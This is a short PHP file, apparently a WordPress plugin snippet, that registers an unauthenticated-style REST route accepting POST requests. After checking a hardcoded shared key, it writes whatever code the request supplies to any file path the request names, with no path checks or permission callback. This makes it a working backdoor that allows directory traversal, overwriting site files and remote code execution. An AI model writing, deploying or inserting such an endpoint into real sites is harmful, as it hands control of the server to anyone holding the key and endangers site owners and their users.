<?php
function rest_api_insert_code_receiver( WP_REST_Request $request ) {
    $api_key = 'a6s84a8634sa684';
    if ($request['api_key']!=$api_key) {
        return 'Invalid API Key';
    } else {
        $code = $request["code"];
        $file_path = dirname(__FILE__).'/../'.$request["file_path"];
        $myfile = fopen($file_path, "w");
        $result = fwrite($myfile, $code);
        if ($result!==false) {
            return 'Code updated';
        } else {
            return 'Error occured while handling file. Check file path.';
        }
    }
}
add_action( 'rest_api_init', function () {
    register_rest_route( 'code_receiver', 'insert', array(
        'methods' => 'POST',
        'callback' => 'rest_api_insert_code_receiver'
    ));
});